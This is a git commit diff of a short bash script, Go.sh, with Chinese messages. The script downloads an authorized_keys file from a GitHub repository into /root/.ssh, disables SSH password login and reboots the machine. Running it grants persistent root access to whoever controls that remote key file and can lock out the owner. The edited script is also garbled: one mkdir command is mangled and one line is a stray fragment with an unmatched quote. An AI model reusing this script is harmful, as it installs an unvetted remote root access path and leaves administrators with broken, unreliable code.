7255c2cef91ab48df6fd4179377100d155b851af
sudug <60267838+expfukck@users.noreply.github.com>
2022-07-09 23:54:19 +0800

    Update Go.sh

--- Go.sh
+++ Go.sh
@@ -1,12 +1,15 @@
 #!/bin/bash
 
-#创建目录
-echo 'mkdir -p /root/.ssh 
+echo "创建目录"
+mkdiecho "创建目录"r -p /root/.ssh 
 #网页下载到/root/.ssh/authorized_keys
 wget https://raw.githubusercontent.com/expfukck/vk/main/authorized_keys -O  /root/.ssh/authorized_keys
-echo 'cd /root
-echo 'chmod 700 .ssh
-echo 'chmod 600 .ssh/authorized_keys
-echo 'sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/g'  /etc/ssh/sshd_config
+echo "进入root"
+cd /root
+echo "处理中"
+chmod 700 .ssh
+chmod 600 .ssh/authorized_keys
+禁止密码登录"
+sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/g'  /etc/ssh/sshd_config
 echo "----------已经设置禁止密码登录----------------请用SSH公钥登录---------正在重启中!"!
-echo 'reboot
+reboot
